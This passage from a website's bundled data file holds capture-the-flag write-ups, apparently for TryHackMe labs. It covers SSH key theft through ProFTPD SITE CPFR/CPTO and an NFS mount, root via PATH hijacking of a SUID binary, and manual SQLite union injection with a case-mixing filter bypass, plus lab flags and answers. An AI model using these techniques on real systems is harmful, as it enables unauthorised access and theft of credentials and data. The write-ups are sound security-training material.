style=\\"color:#da1953\\">Acc</span>ess as Kenobi</h1>","body":["<p>To access via SSH as Kenobi I can simply use the downloaded private key without any passwrd. Before that I have to set the file permission to 600.<br><code><b>$ </b>chmod 600 id_rsa</code></p>","<p><pre><b>$ </b>ssh -i ./id_rsa kenobi@10.10.184.80<br>The authenticity of host \'10.10.184.80 (10.10.184.80)\' can\'t be established.<br>ED25519 key fingerprinis SHA256:GXu1mgqL0Wk2ZHPmEUVIS0hvusx4hk33iTcwNKPktFw.<br>This host key is known by the following other names/addresses:<br>    ~/.ssh/known_hosts:11[hashed name]<br>    ~/.ssh/known_hosts:12: [hashed name]<br>    ~/.ssh/known_hosts:13: [hashed name]<br>Are you sure you want to continue connecting (yeno/[fingerprint])? yes<br>Warning: Permanently added \'10.10.184.80\' (ED25519) to the list of known hosts.<br>Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.0-58-generic x86_64)<br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https:ubuntu.com/advantage<br><br>103 packages can be updated.<br>65 updates are security updates.<br><br><br>Last login: Wed Sep  4 07:10:15 2019 from 192.161.147<br>To run a command as administrator (user \\"root\\"), use \\"sudo <command>\\".<br>See \\"man sudo_root\\" for details.<br><br><b>kenobi@kenobi</b>:~$</pre></p>","<p>You can find the user flag in the current directory which is Kenobi\'s home directory.</p>","<p><pre><b>kenobi@kenobi</b>:~$ cat user.txt<br>d0b0f3f53b6caa532a83915e19224899</pre></p>"]},{"id":"Privilege Escalation","title":"<h1><span style=\\"color:#da1953\\">Pri</span>vilege Escalation</h1>","body":[{"id":"Host enumeration","title":"<h2>Host enumeration</h2>","body":["<p>The first thing I usually do to find a misconfiguration to elevate my privilege is execute <code>sudo -l</code> to check what program I can run with sudo privilege without the need for the password.</p>","<p><img src=\\"/cyber/writeup/kenobi/sudopass.PNG\\" alt=\\"\\"></p>","<p>Unfortunately on this occasion, I am not able to run the command as I do not know the password and I need to figure out a different strategy. If I want to proceed with manual enumeration it will take me a very long when I can use <a href=\\"https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS\\">Linpeas</a> and go from there, saving a lot of time.</p>","<p>I first downloaded <a href=\\"https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS\\">Linpeas</a> on my Kali box and then downloaded it to the target machine via Python webserver.</p>","<p><pre><b>$ </b>python -m http.server 80<br>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...<br>10.10.220.32 - - [31/Mar/2025 06:50:57] \\"GET /linpeas.sh HTTP/1.1\\" 200 -</pre></p>","<p><pre><b>kenobi@kenobi</b>:~$ wget http://10.21.112.161/linpeas.sh<br>--2025-03-31 05:50:56--  http://10.21.112.161/linpeas.sh<br>Connecting to 10.21.112.161:80... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 840082 (820K) [text/x-sh]<br>Saving to: ‘linpeas.sh’<br><br>linpeas.sh                                100%[==================================================================================>] 820.39K  1.49MB/s    in 0.5s    <br><br>2025-03-31 05:50:57 (1.49 MB/s) - ‘linpeas.sh’ saved [840082/840082]</pre></p>","<p><a href=\\"https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS\\">Linpeas</a> makes your life easy by telling you what to check.</p>","<p><img src=\\"/cyber/writeup/kenobi/linlegend.PNG\\" alt=\\"\\"></p>","<p>And the first thing it flags is the PATH, and it also gives the link to <a href=\\"https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses\\">Hacktricks</a> for further information.</p>","<p><img src=\\"/cyber/writeup/kenobi/path.PNG\\" alt=\\"\\"></p>","<p>The first thing Hacktricks suggests is performing <code>sudo -l</code> which I already discarded, the second command to find the programs that contain SUID is <code>find / -perm -4000 2>/dev/null</code>.</p>","<p><img src=\\"/cyber/writeup/kenobi/hacktrickssuid.jpg\\" alt=\\"\\"></p>","<p>And it shows the following installed programs:</p>","<p><pre><b>kenobi@kenobi</b>:~$ find / -perm -4000 2>/dev/null<br>/sbin/mount.nfs<br>/usr/lib/policykit-1/polkit-agent-helper-1<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/snapd/snap-confine<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic<br>/usr/bin/chfn<br>/usr/bin/newgidmap<br>/usr/bin/pkexec<br>/usr/bin/passwd<br>/usr/bin/newuidmap<br>/usr/bin/gpasswd<br>/usr/bin/menu<br>/usr/bin/sudo<br>/usr/bin/chsh<br>/usr/bin/at<br>/usr/bin/newgrp<br>/bin/umount<br>/bin/fusermount<br>/bin/mount<br>/bin/ping<br>/bin/su<br>/bin/ping6</pre></p>","<p>Here the output is mixed with user installed program and the system program, but I am pretty sure you can guess which program was installed by the user and is not a system program. To double check I checked the <a href=\\"https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS\\">Linpeas</a> output.</p>","<p><img src=\\"/cyber/writeup/kenobi/linoutput.PNG\\" alt=\\"\\"></p>","<p>The only program that seems actually installed by the user is the <b>menu</b> program.</p>"]},{"id":"Hijacking execution","title":"<h2>Hijacking execution</h2>","body":["Folllwing the execution of the <b>menu</b> program","<p><pre><b>kenobi@kenobi</b>:~$ /usr/bin/menu<br><br>***************************************<br>1. status check<br>2. kernel version<br>3. ifconfig<br>** Enter your choice :1<br>HTTP/1.1 200 OK<br>Date: Mon, 31 Mar 2025 11:21:04 GMT<br>Server: Apache/2.4.18 (Ubuntu)<br>Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT<br>ETag: \\"c8-591b6884b6ed2\\"<br>Accept-Ranges: bytes<br>Content-Length: 200<br>Vary: Accept-Encoding<br>Content-Type: text/html<br><br><b>kenobi@kenobi</b>:~$ /usr/bin/menu<br><br>***************************************<br>1. status check<br>2. kernel version<br>3. ifconfig<br>** Enter your choice :2<br>4.8.0-58-generic<br><br><b>kenobi@kenobi</b>:~$ /usr/bin/menu<br><br>***************************************<br>1. status check<br>2. kernel version<br>3. ifconfig<br>** Enter your choice :3<br>eth0      Link encap:Ethernet  HWaddr 02:64:f3:a4:88:b7  <br>          inet addr:10.10.220.32  Bcast:10.10.255.255  Mask:255.255.0.0<br>          inet6 addr: fe80::64:f3ff:fea4:88b7/64 Scope:Link<br>          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1<br>          RX packets:1955 errors:0 dropped:0 overruns:0 frame:0<br>          TX packets:1974 errors:0 dropped:0 overruns:0 carrier:0<br>          collisions:0 txqueuelen:1000 <br>          RX bytes:966897 (966.8 KB)  TX bytes:362406 (362.4 KB)<br><br>lo        Link encap:Local Loopback  <br>          inet addr:127.0.0.1  Mask:255.0.0.0<br>          inet6 addr: ::1/128 Scope:Host<br>          UP LOOPBACK RUNNING  MTU:65536  Metric:1<br>          RX packets:190 errors:0 dropped:0 overruns:0 frame:0<br>          TX packets:190 errors:0 dropped:0 overruns:0 carrier:0<br>          collisions:0 txqueuelen:1 <br>          RX bytes:14101 (14.1 KB)  TX bytes:14101 (14.1 KB)<br></pre></p>","<p>From the execution nothing interesting, everything seems pretty basic, but the program has SUID which we confirmed earlier during the enumeration phase. Let\'s try to <code>strings</code> the program.</p>","<p><pre><b>kenobi@kenobi</b>:~$ strings /usr/bin/menu<br>/lib64/ld-linux-x86-64.so.2<br>libc.so.6<br>setuid<br>[...REDACTED...]<br>***************************************<br>1. status check<br>2. kernel version<br>3. ifconfig<br>** Enter your choice :<br>curl -I localhost<br>uname -r<br>ifconfig<br>[...REDACTED...]</pre></p>","<p>The presence of the <i>suid</i> string makes clear that it is executing the program commands: <code>curl -I localhost</code>, <code>uname -r</code>, <code>ifconfig</code>, with elevated privilege.</p>","<p>To hijack the exection I need to check the PATH variable. The question to ask is: how does the terminal know where the program is when I write the name in the terminal like id, pwd, ls etc.? It uses a variable called PATH that lists a series of folder to check if they contains any program with the spcified name.</p>","<p><pre><b>kenobi@kenobi</b>:~$ $PATH<br>-bash: /home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin: No such file or directory</pre></p>","<p>in this case the search paths are <i>/home/kenobi/bin</i>, <i>/home/kenobi/.local/bin</i>, <i>/usr/local/sbin</i>, <i>/usr/local/bin</i>, <i>/usr/sbin</i>, <i>/usr/bin</i>, <i>/sbin</i>, <i>/bin</i>, <i>/usr/games</i>, <i>/usr/local/games</i>, <i>/snap/bin</i>, and the first match will be executed as it check these folder in order. Each user has their own list of paths stored in the PATH variable. This means different users can have different paths where the system looks for programs.</p>","<p>If I create a program and put it in the first path of the list, the system will check that path first before looking at others. If it finds the program there, it won’t check the rest of the paths. This can be used to trick the system into executing unintended programs.</p>","<p>The first path is <code>/home/kenobi/bin</code> which is in the home directory. The bin folder does not exist so I can create it <code>mkdir bin</code> and put in a program named ifconfig that does a simple <code>/bin/bash</code> and it will be executed by the menu program with suid and root privileges.</p>","<p><pre><b>kenobi@kenobi</b>:~$ pwd<br>/home/kenobi<br><b>kenobi@kenobi</b>:~$ mkdir bin<br><b>kenobi@kenobi</b>:~$ echo -e \'#!/bin/bash\\\\n/bin/bash\' > ./bin/ifconfig<br><b>kenobi@kenobi</b>:~$ cat ./bin/ifconfig <br>#!/bin/bash<br>/bin/bash<br><b>kenobi@kenobi</b>:~$ chmod 777 ./bin/ifconfig</pre></p>","<p>Note that I used <code>-e</code> options for the <code>echo</code> command as there is a new line and it has to be enclosed in single quotes! Additionally, the new <code>ifconfig</code> program created needs permissions to be executed and I just gave 777 as maximum privileges for everyone as I did not care about giving the minimum privileges.</p>","<p>At this point, I just have to execute the menu program and choose option 3 for <code>ifconfig</code>. Then you can find the flag in the <b>root</b> directory</p>","<p><pre><b>kenobi@kenobi</b>:~$ /usr/bin/menu <br><br>***************************************<br>1. status check<br>2. kernel version<br>3. ifconfig<br>** Enter your choice :3<br>To run a command as administrator (user \\"root\\"), use \\"sudo <command>\\".<br>See \\"man sudo_root\\" for details.<br><br><b>root@kenobi</b>:~# whoami<br>root<br><b>root@kenobi</b>:~# cat /root/root.txt <br>177b3cd8562289f37382721c28381f02</pre></p>"]}]},{"id":"Intended way","title":"<h1><span style=\\"color:#da1953\\">Int</span>ended way</h1>","body":[{"id":"Enumerating NFS","title":"<h2>Enumerating NFS</h2>","body":["<p><pre><b>$ </b>nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.76.103<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-31 16:24 EDT<br>Nmap scan report for 10.10.76.103<br>Host is up (0.073s latency).<br><br>PORT    STATE SERVICE<br>111/tcp open  rpcbind<br>| nfs-showmount: <br>|_  /var *<br><br>Nmap done: 1 IP address (1 host up) scanned in 1.09 seconds</pre></p>","<p>This shows that the NFS mounts the <code>/var</code> folder so I can use <code>/var</code> and any sub-folders. If I mount the NFS I will be able to see the whole file structure of the <code>/var</code> folder. It means if I copy the <code>id_rsa</code> file into <code>/var/tmp</code> and then mount the NFS and access the SSH private key.</p>"]},{"id":"Access and exploit ProFTPD via NetCat","title":"<h2>Access and exploit ProFTPD via NetCat</h2>","body":["<p><pre><b>$ </b>nc 10.10.76.103 21<br>220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.76.103]<br>SITE CPFR /home/kenobi/.ssh/id_rsa<br>350 File or directory exists, ready for destination name<br>SITE CPTO /var/tmp/id_rsa<br>250 Copy successful</pre></p>"]},{"id":"Mounting NFS to retrieve SSH private key","title":"<h2>Mounting NFS to retrieve SSH private key</h2>","body":["<p><pre><b>$</b> sudo mkdir /mnt/kenobiNFS<br>[sudo] password for kali:<br><b>$</b> sudo mount 10.10.76.103:/var /mnt/kenobiNFS<br><b>$</b> ls -la /mnt/kenobiNFS<br>total 56<br>drwxr-xr-x 14 root root  4096 Sep  4  2019 .<br>drwxr-xr-x  3 root root  4096 Mar 31 16:39 ..<br>drwxr-xr-x  2 root root  4096 Sep  4  2019 backups<br>drwxr-xr-x  9 root root  4096 Sep  4  2019 cache<br>drwxrwxrwt  2 root root  4096 Sep  4  2019 crash<br>drwxr-xr-x 40 root root  4096 Sep  4  2019 lib<br>drwxrwsr-x  2 root staff 4096 Apr 12  2016 local<br>lrwxrwxrwx  1 root root     9 Sep  4  2019 lock -> /run/lock<br>drwxrwxr-x 10 root _ssh  4096 Sep  4  2019 log<br>drwxrwsr-x  2 root mail  4096 Feb 26  2019 mail<br>drwxr-xr-x  2 root root  4096 Feb 26  2019 opt<br>lrwxrwxrwx  1 root root     4 Sep  4  2019 run -> /run<br>drwxr-xr-x  2 root root  4096 Jan 29  2019 snap<br>drwxr-xr-x  5 root root  4096 Sep  4  2019 spool<br>drwxrwxrwt  6 root root  4096 Mar 31 16:36 tmp<br>drwxr-xr-x  3 root root  4096 Sep  4  2019 www<br><b>$</b> ls /mnt/kenobiNFS/tmp/<br>id_rsa<br>systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM<br>systemd-private-6bb93e4c0c12426383667820b5bc38ed-systemd-timesyncd.service-MVbD23<br>systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw<br>systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn<br><b>$</b> cp /mnt/kenobiNFS/tmp/id_rsa /home/kali/thm/kenobi/</pre></p>","<p>Now on you can continue reading from <a href=\\"#Access-as-Kenobi\\">Access as Kenobi</a>.</p>"]}]}]}]}')},6184:e=>{"use strict";e.exports=JSON.parse('{"note":"title must match route name in App.js","title":"Lightroom","path":"lightroom","tags":["easy","ctf","box","thm","sql","sqlite"],"date":"JAN 2025","location":"./writeup/","banner":"writeup/lightroom/banner.gif","type":"writeup","search":[{"section":"Scanning","description":"Scanning with nmap and finding the host exposing posts 22 ssh, 1337 tcp"},{"section":"Enumeration","description":"Enumerating SQLite and its tables by performing manual SQL Injection (SQLi)"},{"section":"Enumeration","description":"Inspecting SQLite System tables to retrieve table information and SQL query used to create the table"},{"section":"Exploitation","description":"Performing manual SQL Injection to retrieve sensitive information from SQLite database"},{"section":"Enumeration","description":"Explaining why the SQL Injection (SQLi) attack works in this SQLite database"}],"body":[{"id":"Lightroom","title":"<h1> <span style=\\"color:#da1953\\">Lig</span>htroom</h1><hr>","body":[{"id":"banner","title":"","body":["<img src=\\"/cyber/writeup/lightroom/banner.gif\\" alt=\\"\\">"]},{"id":"Scanning","title":"<hr><h1><span style=\\"color:#da1953\\">Sca</span>nning</h1>","body":["<p><pre># Nmap 7.94SVN scan initiated Thu Jan 30 15:28:56 2025 as: nmap -sC -sV -oA namp -p- 10.10.97.2<br>Nmap scan report for 10.10.97.2<br>Host is up (0.040s latency).<br>Not shown: 65533 closed tcp ports (conn-refused)<br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   3072 61:c5:06:f2:4a:20:5b:cd:09:4d:72:b0:a5:aa:ce:71 (RSA)<br>|   256 51:e0:5f:fa:81:64:d3:d9:26:24:16:ca:45:94:c2:00 (ECDSA)<br>|_  256 77:e1:36:3b:95:9d:e0:3e:0a:56:82:b2:9d:4c:fe:1a (ED25519)<br>1337/tcp open  waste?<br>| fingerprint-strings: <br>|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: <br>|     Welcome to the Light database!<br>|     Please enter your username:<br>|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest: <br>|     Welcome to the Light database!<br>|     Please enter your username: Username not found.<br>|_    Please enter your username:<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>SF-Port1337-TCP:V=7.94SVN%I=7%D=1/30%Time=679BE12E%P=x86_64-pc-linux-gnu%r<br>SF:(NULL,3B,\\"Welcome\\\\x20to\\\\x20the\\\\x20Light\\\\x20database!\\nPlease\\\\x20enter\\\\x<br>SF:20your\\\\x20username:\\\\x20\\")%r(GenericLines,6B,\\"Welcome\\\\x20to\\\\x20the\\\\x20Li<br>SF:ght\\\\x20database!\\nPlease\\\\x20enter\\\\x20your\\\\x20username:\\\\x20Username\\\\x20n<br>SF:ot\\\\x20found\\\\.\\nPlease\\\\x20enter\\\\x20your\\\\x20username:\\\\x20\\")%r(GetRequest,<br>SF:6B,\\"Welcome\\\\x20to\\\\x20the\\\\x20Light\\\\x20database!\\nPlease\\\\x20enter\\\\x20your<br>SF:\\\\x20username:\\\\x20Username\\\\x20not\\\\x20found\\\\.\\nPlease\\\\x20enter\\\\x20your\\\\x2<br>SF:0username:\\\\x20\\")%r(HTTPOptions,6B,\\"Welcome\\\\x20to\\\\x20the\\\\x20Light\\\\x20dat<br>SF:abase!\\nPlease\\\\x20enter\\\\x20your\\\\x20username:\\\\x20Username\\\\x20not\\\\x20foun<br>SF:d\\\\.\\nPlease\\\\x20enter\\\\x20your\\\\x20username:\\\\x20\\")%r(RTSPRequest,6B,\\"Welco<br>SF:me\\\\x20to\\\\x20the\\\\x20Light\\\\x20database!\\nPlease\\\\x20enter\\\\x20your\\\\x20usern<br>SF:ame:\\\\x20Username\\\\x20not\\\\x20found\\\\.\\nPlease\\\\x20enter\\\\x20your\\\\x20username<br>SF::\\\\x20\\")%r(RPCCheck,3B,\\"Welcome\\\\x20to\\\\x20the\\\\x20Light\\\\x20database!\\nPlea<br>SF:se\\\\x20enter\\\\x20your\\\\x20username:\\\\x20\\")%r(DNSVersionBindReqTCP,3B,\\"Welco<br>SF:me\\\\x20to\\\\x20the\\\\x20Light\\\\x20database!\\nPlease\\\\x20enter\\\\x20your\\\\x20usern<br>SF:ame:\\\\x20\\")%r(DNSStatusRequestTCP,3B,\\"Welcome\\\\x20to\\\\x20the\\\\x20Light\\\\x20d<br>SF:atabase!\\nPlease\\\\x20enter\\\\x20your\\\\x20username:\\\\x20\\")%r(Help,6B,\\"Welcome<br>SF:\\\\x20to\\\\x20the\\\\x20Light\\\\x20database!\\nPlease\\\\x20enter\\\\x20your\\\\x20usernam<br>SF:e:\\\\x20Username\\\\x20not\\\\x20found\\\\.\\nPlease\\\\x20enter\\\\x20your\\\\x20username:\\\\<br>SF:x20\\")%r(SSLSessionReq,3B,\\"Welcome\\\\x20to\\\\x20the\\\\x20Light\\\\x20database!\\nP<br>SF:lease\\\\x20enter\\\\x20your\\\\x20username:\\\\x20\\")%r(TerminalServerCookie,3B,\\"We<br>SF:lcome\\\\x20to\\\\x20the\\\\x20Light\\\\x20database!\\nPlease\\\\x20enter\\\\x20your\\\\x20us<br>SF:ername:\\\\x20\\")%r(TLSSessionReq,3B,\\"Welcome\\\\x20to\\\\x20the\\\\x20Light\\\\x20data<br>SF:base!\\nPlease\\\\x20enter\\\\x20your\\\\x20username:\\\\x20\\")%r(Kerberos,3B,\\"Welcom<br>SF:e\\\\x20to\\\\x20the\\\\x20Light\\\\x20database!\\nPlease\\\\x20enter\\\\x20your\\\\x20userna<br>SF:me:\\\\x20\\")%r(SMBProgNeg,3B,\\"Welcome\\\\x20to\\\\x20the\\\\x20Light\\\\x20database!\\n<br>SF:Please\\\\x20enter\\\\x20your\\\\x20username:\\\\x20\\")%r(X11Probe,3B,\\"Welcome\\\\x20to<br>SF:\\\\x20the\\\\x20Light\\\\x20database!\\nPlease\\\\x20enter\\\\x20your\\\\x20username:\\\\x20<br>SF:\\")%r(FourOhFourRequest,6B,\\"Welcome\\\\x20to\\\\x20the\\\\x20Light\\\\x20database!\\n<br>SF:Please\\\\x20enter\\\\x20your\\\\x20username:\\\\x20Username\\\\x20not\\\\x20found\\\\.\\nPle<br>SF:ase\\\\x20enter\\\\x20your\\\\x20username:\\\\x20\\");<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br># Nmap done at Thu Jan 30 15:32:09 2025 -- 1 IP address (1 host up) scanned in 192.67 seconds<br></pre></p>","<p>I have two services: port 22 SSH,  and 1337 TCP. The next step is to enumerate each of them with lots of patient. My first scan was a standard scan <code>nmap -sC -sV -oN nmap 10.10.97.2</code> but this can revealed only port 22 ssh, so I did a more comprehensive scan adding the flag <i>-p-</i> to scall all the ports.</p>"]},{"id":"Enumeration","title":"<hr><h1><span style=\\"color:#da1953\\">Enu</span>meration</h1>","body":["<p>The only port that is worth enumeration at this stage is 1337, additionally the challenges gives me some informmation about how to interact with this service.</p>","<p><blockquote>You can connect to it using <code>nc MACHINE_IP 1337</code>. You can use the username <b>smokey</b> in order to get started.</blockquote></p>","<p>Once connected the first thing I have is a prompt that says Welcome to Light database, and it feels like a hint... the next prompt tells me to enter a username.</p>","<p><pre>$ nc 10.10.37.110 1337<br>Welcome to the Light database!<br>Please enter your username: </pre></p>","<p>As suggested by the challenge description entering the username smokey tells me his password.</p>","<p><pre>$ nc 10.10.37.110 1337<br>Welcome to the Light database!<br>Please enter your username: smokey<br>Password: vYQ5ngPpw8AdUmL<br>Please enter your username:</pre></p>","<p>Now that I know how to interact with the service I need to exploit it and the only attack that came into my mind at the time of doing the box was the SQL Injection (SQLi). Also searching for lightweight database on Google I have a list of lightweight databases and among them, there is one in particular that catches my interest.</p>","<img src=\\"/cyber/writeup/lightroom/dbsearch.jpg\\" alt=\\"\\">","<p>As I was not able to verify that it was actually SQLite from this point I proceeded assuming it was SQLite and I will use table and schemas for SQLite hoping it will work. If it doesent I will have to try a different one...</p>","<p><img src=\\"/cyber/writeup/lightroom/fingercrossed.png\\" alt=\\"\\"></p>","<p>My first attempt was some SQL Injection query from Wikipedia and it\'s showing the following queries.</p>","<p><pre>\' OR \'1\'=\'1\' --<br>\' OR \'1\'=\'1\' {<br>\' OR \'1\'=\'1\' /* </pre></p>","<p>By entering the first query I received an error message \\"<i>For strange reasons I can\'t explain, any input containing /*, -- or, %0b is not allowed :)</i>\\" so my first idea was to try without the \\"--\\" which is a comment statement. Now the application is giving me a different error, \\"<i>Error: unrecognized token: \\"\'1\'\' LIMIT 30</i>\\".</p>","<p><pre>Please enter your username: smokey \' or \'1\' = \'1\' --<br>For strange reasons I can\'t explain, any input containing /*, -- or, %0b is not allowed :)<br>Please enter your username: smokey \' or \'1\' = \'1\'<br>Error: unrecognized token: \\"\'1\'\' LIMIT 30\\"<br>Please enter your username:</pre></p>","LIMIT is a SQL clause that tells the number of rows to output, and the main thing to note here is the number of single quotes in the message! There are 3! an extra one.","<p>At this point, I can try to guess how is the original query being executed behind the scenes. <code>SELECT [columnName] FROM [tableName] WHERE [columnNmae] = \'[userinput]\' LIMIT 30</code> where <b>columnName</b> can be something like <i>user</i>, <i>username</i> or just <i>name</i>.</p>","<p>Now the error was caused because my input contained an extra single quote that was added to the final query making it syntactically wrong. Let\'s assume the column name is <b>username</b> and the table name is <b>users</b> for this example.</p>","<p><img src=\\"/cyber/writeup/lightroom/sqli1.jpg\\" alt=\\"\\"></p>","<p>That extra quote I inserted as giving me the syntax error. So to meke it syntacttically correct I have to remove it from my malicious query.</p>","<p><pre>Please enter your username: smokey \' or \'1\' = \'1<br>Password: tF8tj2o94WE4LKC</pre></p>","<p>Now it is working as intended, with no syntax error. But why is it working?</p>","<p><img src=\\"/cyber/writeup/lightroom/sqli2.jpg\\" alt=\\"\\"></p>","<p>Time to retrieve the admin\'s password assuming there is an admin user. Let\'s test and see what the application says, it may give me more information about the application\'s behaviour.</p>","<p>It is still giving me the same password!</p>","<p><pre>Please enter your username: admin \' or \'1\' = \'1<br>Password: tF8tj2o94WE4LKC</pre></p>","<p>This is because the user \\"admin\\" does not exist in the database so the first part of the query fails and the cond part passes <i>FALSR or TRUE = TRUE</i> but when TRUE is given in a query it returns all the occurrences, being <i>smokey</i> the only entry of the table it returns the same password.</p>","<p><img src=\\"/cyber/writeup/lightroom/sqli3.jpg\\" alt=\\"\\"></p>","<p>At this point I have to try different type of SQL Injections. By searching for different types of SQL Injection on Google this <a href=\\"https://www.imperva.com/learn/application-security/sql-injection-sqli/\\">page</a> came out. From the list thanks to my experience I can tell the most suitable type would be the Union base SQL Injection.</p>","<p>I tried different types of Union-based SQLi, and none of them worked due to the input check.</p>","<p><pre>Please enter your username: \' or 1=1; --<br>For strange reasons I can\'t explain, any input containing /*, -- or, %0b is not allowed :)<br>Please enter your username: admin SELECT * FROM all_tables<br>Ahh there is a word in there I don\'t like :(<br>Please enter your username: admin \' or UNION ALL SELECT NULL,version()--<br>For strange reasons I can\'t explain, any input containing /*, -- or, %0b is not allowed :)<br>Please enter your username: admin \' UNION ALL SELECT NULL,version()  <br>Ahh there is a word in there I don\'t like :(</pre></p>","<p>After a few tries by luck, I understood that there was a filter on SQL keywords that was bypassable by mixing capital letters. So instead of SELECT and UNION or all lowercase select and union, I had to write Select or uNion.</p>","<p>Now I need more inforamation about the database instead of trying to guess the table and column names.</p>","<p>Searching for <a href=\\"https://www.techonthenet.com/sqlite/sys_tables/index.php\\">SQLite sytem table</a> I found out the following tables:</p>","<p><b>SQLite: System Tables</b></p>","<p><table>  <thead>  <tr><th>System Table</th><th>Description</th>  </tr></thead><tbody><tr><td>sqlite_master</td><td>Master listing of all database objects in the database and the SQL used to create each object.</td>  </tr>  <tr><td>sqlite_sequence</td><td><p>Lists the last sequence number used for the AUTOINCREMENT column in a table.</p><p>The <em>sqlite_sequence</em> table will only be created once an AUTOINCREMENT column has been defined in the database and at least one sequence number value has been generated and used in the database.</p></td>  </tr>  <tr>    <td>sqlite_stat1</td>    <td>This table is created by the <a href=\\"/sqlite/analyze.php\\">ANALYZE command</a> to store statistical information about the tables and indexes analyzed. This information will be later used by the query optimizer.</td>  </tr>  </tbody></table></p>","<p><b>SQLite Master Table: sqlite_master</b></p>","<p><table>  <thead>  <tr>    <th>Column Name</th>    <th>Description</th>  </tr>  </thead>  <tbody>  <tr>    <td>type</td>    <td>The type of database object such as table, index, trigger or view.</td>  </tr>  <tr>    <td>name</td><td>The name of the database object.</td>  </tr>  <tr>    <td>tbl_name</td>    <td>The table name that the database object is associated with.</td>  </tr>  <tr><td>rootpage</td><td>Root page.</td></tr>  <tr><td>sql</td><td>SQL used to create the database object.</td></tr>  </tbody></table></p>","<p>Now I can enumerate the tables in this database and the query used to create the table.</p>","<p><pre>Please enter your username: smokey \' Union Select tbl_name From sqlite_master Where type=\'table<br>Password: admintable<br>Please enter your username: smokey \' Union Select sql From sqlite_master Where type=\'table<br>Password: CREATE TABLE admintable (<br>                   id INTEGER PRIMARY KEY,<br>                   username TEXT,<br>                   password INTEGER)<br></pre></p>","<p>Now that I know the structure of this table I can craft specific query to extract the information in it.</p>"]},{"id":"Exploitation","title":"<hr><h1><span style=\\"color:#da1953\\">Exp</span>loitation</h1>","body":["<p>After a few tries I came up with the following query to print the username to answer the first question.</p>","<p><pre>Please enter your username: smokey \' uNIon Select username fRom admintable WHere username Like \'%<br>Password: TryHackMeAdmin</pre></p>","<p><b>Q</b>: <i>What is the admin username?</i><br><b>A</b>: <i>TryHackMeAdmin</i></p>","<p>After confirming the table name and the column name I can craft the query to extract the passowrd</p>","<p><pre>Please enter your username: smokey \' uNIon Select password fRom admintable WHere username=\'TryHackMeAdmin<br>Password: mamZtAuMlrsEy5bp6q17</pre></p>","<p><b>Q</b>: <i>What is the password to the username mentioned in question 1?</i><br><b>A</b>: <i>mamZtAuMlrsEy5bp6q17</i></p>","<p>To extract the flag after many attempts again doing random queries I wanted to print out everything in the table with the clause LIKE \'%\' as I was tired of extracting exactly the password. Why focusing extracting the password when I can extract everything in the table?</p>","<p><pre>Please enter your username: smokey \' uNIon Select password fRom admintable WHere password Like \'%<br>Password: THM{SQLit3_InJ3cTion_is_SimplE_nO?}</pre></p>","<p><b>Q</b>: <i>What is the flag?</i><br><b>A</b>: <i>THM{SQLit3_InJ3cTion_is_SimplE_nO?}</i></p>"]}]}]}')},7949:e=>{"use strict";e.exports=JSON.parse('{"note":"title must match route name in App.js","title":"Lookup","path":"lookup","tags":["hydra","bruteforcing","easy","linux password","box","thm","web","python","user enumeration","elfinder 2.1.47","linux","privesc","ssh","dictionary attack","cve","login panel","nc","php","rce","reverse shell"],"date":"DEC 2024","location":"./writeup/","banner":"writeup/lookup/banner.gif","type":"writeup","search":[{"section":"Scanning","description":"Scanning with Nmap, discovering ports 22 ssh and 80 http"},{"section":"Setting /etc/hosts","description":"Adding the domain to /etc/hosts"},{"section":"Directory bruteforcing","description":"Directory bruteforcing with gobuster including file extentions for comprehensinve scanning"},{"section":"User enumeration","description":"Enumerating users with python script, setting request headers and implementing multi threading for faster execution"},{"section":"Bruteforcing password","description":"Brute force login panel password field with Hydra and wordlist sending post form"},{"section":"Shell as www-data","description":"Exploiting elFinder 2.1.47 wiht public CVE to obtain a reverse shell"},{"section":"SUID program to exploit","description":"Performing enumeration and checking for programs with SUID"},{"section":"Hijackin program execution","description":"Hijacking and redirecting the execution of the <i>id</i> command to a maliciously crafted version of the program by modifying the PATH environment variable. By prepending a custom path to the PATH variable, the system is directed to execute the malicious version of <i>id</i> instead of the legitimate one. This causes it to behave differently and produce intended malicious output, which can be leveraged for command hijacking or local privilege escalation."},{"section":"Hijackin program execution","description":"Altered and change the PATH variable to redirect program execution to a malicious one"},{"section":"Bruteforcing SSH password","description":"Bruteforcing SSH password with Hydra using wordlist"},{"section":"Bruteforcing SSH password","description":"Logging with SSH using the password"},{"section":"Privilege escalation","description":"Attept cracking Linux password from shadow file of root 